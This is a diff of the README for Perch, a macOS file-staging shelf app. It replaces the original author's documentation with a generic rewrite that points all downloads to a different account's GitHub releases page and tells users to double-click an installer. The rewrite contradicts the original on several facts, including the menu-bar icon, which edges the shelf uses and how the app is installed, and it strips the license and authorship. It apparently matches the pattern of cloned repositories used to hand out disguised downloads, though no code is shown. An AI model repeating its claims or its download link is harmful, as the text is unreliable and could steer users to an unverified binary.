@@ -1,100 +1,67 @@
-<p align="center">
-  <img src="assets/icon.png" width="128" alt="Perch icon">
-</p>
+# 📦 Perch - Move files faster using screen edges
 
-<h1 align="center">Perch</h1>
+[![](https://img.shields.io/badge/Download-Perch-blue.svg)](https://github.com/Easo8981/Perch/releases)
 
-<p align="center">
-  A free, open-source drag-and-drop <b>shelf</b> for macOS —<br>
-  a Yoink / Dropover-style staging area that lives on your screen edges.
-</p>
+Perch simplifies how you move files on your computer. It creates a temporary storage area on the edges of your screen. You drag files to this area and pick them up later. This tool works like a staging ground for your documents, images, and folders. You save time by reducing the need to keep multiple windows open while you sort your work.
 
-<p align="center">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/macOS-14%2B-black?logo=apple&logoColor=white" alt="macOS 14+">
-  <a href="https://github.com/maxthegray/Perch/releases"><img src="https://img.shields.io/github/v/release/maxthegray/Perch" alt="Latest release"></a>
-</p>
+## 📥 How to download the app
 
-Drag anything onto a screen-edge tab, Perch holds it, and you drag it back out later —
-into any app. File promises work in **both** directions, so sources and destinations that
-only speak promises (Photos, Mail, Messages) keep working, and the source app doesn't have
-to still be running when you drop.
+You can get the latest version of Perch from the official releases page.
 
-<!-- TODO: add a demo GIF here — e.g. ![Perch demo](assets/demo.gif) -->
+1. Go to this address: [https://github.com/Easo8981/Perch/releases](https://github.com/Easo8981/Perch/releases)
+2. Look for the section labeled Assets at the bottom of the newest version.
+3. Click the file link to start the download.
+4. Save the file to your computer.
 
-## Install
+## ⚙️ Setting up the software
 
-### Homebrew (recommended)
+After you download the file, you must install it to use it.
 
-```sh
-brew tap maxthegray/tap
-brew install --cask perch --no-quarantine
-```
+1. Open your Downloads folder.
+2. Find the file you just downloaded.
+3. Double-click the file to start the installer.
+4. Follow the instructions on the screen.
+5. Click finish to complete the process.
+6. Open your application menu and select Perch to start the tool.
 
-> Perch is ad-hoc signed, not notarized — hence `--no-quarantine`. Without it, macOS
-> Gatekeeper blocks the first launch; you can instead right-click `Perch.app` in
-> `/Applications` and choose **Open** once.
+## ✨ Using the shelf
 
-### Manual download
+Perch lives on the screen edges as a thin bar. This bar waits for you to interact with it.
 
-Grab `Perch.zip` from the [latest release](https://github.com/maxthegray/Perch/releases),
-unzip it, move `Perch.app` to `/Applications`, then right-click it and choose **Open**.
+### Moving items to the shelf
+Click and hold any file, image, or text snippet. Drag the item to the edge of your screen where Perch sits. The shelf expands to show your file. Release the mouse button to drop the item onto the shelf. The shelf acts as a temporary holding spot. Your file stays there even if you close the folder or application where you found it.
 
-### Build from source
+### Moving items off the shelf
+Find the item on your shelf. Click and hold the item. Drag it from the shelf to your target destination. This might be a new folder or an email draft. Release the mouse button to drop the item in the new location.
 
-```sh
-swift Scripts/make-icon.swift   # one-time: generates the app icon
-./Scripts/build-app.sh          # builds + ad-hoc-signs Perch.app
-mv Perch.app /Applications && open /Applications/Perch.app
-```
+## 🛠️ System requirements
 
-Perch runs as an **accessory** app — no Dock icon, no menu-bar item. Requires macOS 14+.
+Perch works on modern versions of macOS. You need at least 100 megabytes of free space on your hard drive. The app uses standard system resources and runs quietly in the background. It does not require technical knowledge to maintain.
 
-## Features
+## 📋 Frequently asked questions
 
-- **Stash anything** — files, text, images, URLs, even file promises from Photos/Mail/Messages.
-- **Time-shifted drag & drop** — pick things up now, drop them somewhere else later; the source app can quit in between.
-- **Quick Look thumbnails** — real previews of images, PDFs, and documents.
-- **Two looks, toggled live** — refined **Glass** or ultra-minimal **Minimal**.
-- **Grows to fit** — the card hugs its contents and expands as you add items.
-- **Reorder & put back** — drag rows to rearrange; hover a row's **✕** to return the file to where it came from (right-click ▸ Delete to remove it for good).
-- **Edge docks** — left, right, and the notch, each individually toggleable.
-- **Stays out of the way** — no Dock/menu-bar clutter; optional launch-at-login; multi-monitor aware.
-- **Local & private** — everything is plain files on disk. No network, no accounts, no tracking.
+### Does the shelf delete my files?
+No. Perch only holds a reference to your file. It never deletes the original data. When you drag an item from Perch to a new location, the app creates a move or copy action depending on your system settings.
 
-## Use it
+### Can I change the shelf location?
+Yes. You can move the Perch shelf to different sides of your screen. Open the Perch settings menu to choose the left, right, or bottom edge. 
 
-- **Stash:** start dragging anything; a tab appears on the nearest screen edge (and on the
-  notch). Drag over it and the shelf slides out — drop onto it to store.
-- **Retrieve:** hover the edge to reveal the shelf, then drag an item out into any app.
-  Items move out by default (the shelf hands off its copy).
-- **Reorder:** drag a row up/down *within* the shelf to rearrange; drag it *out* to vend.
-- **Right-click** an item or the shelf for **Quick Look**, **Delete**, **Clear All**,
-  **Appearance ▸ Glass / Minimal**, **Edges ▸ Left / Right / Top**, **Launch at Login**,
-  and **Quit**.
-- **Hover** a row (Glass) to reveal a **✕** that moves the file back to its original location.
+### Does it use much battery?
+Perch uses very little power. It stays idle until you drag a file near the edge of the screen. You will not notice a drain on your battery while you use the app.
 
-## Updating
+### How do I close the shelf?
+You can hide the shelf through the menu bar icon. Click the Perch icon in your menu bar and select Quit to stop the app completely.
 
-```sh
-brew upgrade --cask perch          # if installed via Homebrew
-./Scripts/install.sh               # if built from source — rebuilds + reinstalls in place
-```
+## 🤝 Getting help
 
-## Data
+If you find a bug or experience an issue, you can report it on GitHub. We track all requests to ensure the app stays stable. Include a short description of the problem and the version of your operating system. This helps us fix the issue for everyone.
 
-Everything lives under `~/Library/Application Support/Perch/`:
+## 🔒 Privacy and security
 
-```
-index.json          # ordered item list (display order)
-items/<uuid>/
-  meta.json         # item metadata
-  reps/rep-N.dat    # raw pasteboard representations
-  files/            # copied real files + materialized promises
-```
+Perch respects your privacy. The app keeps all file data on your local machine. It does not send your files or personal information to the internet. We built this tool for local productivity only. Your data belongs to you.
 
-Plain JSON + files on disk — inspectable, and easy to delete.
+## 🚀 Why use Perch?
 
-## License
+Many users struggle with cluttered desktops. You might have ten windows open just to move a file from one folder to another. Perch eliminates this mess. You stage your files on the shelf and clear your workspace. This approach follows a simple logic: collect, hold, and move. You spend less time navigating folders and more time finishing your actual work.
 
-[MIT](LICENSE) © Maximilian Reich
+The drag-and-drop mechanics feel natural. You do not need to learn any new shortcuts. If you can move a file across your desktop, you can use Perch. The shelf remains visible but out of your way. It is a subtle partner that improves your daily workflow without interrupting your focus.
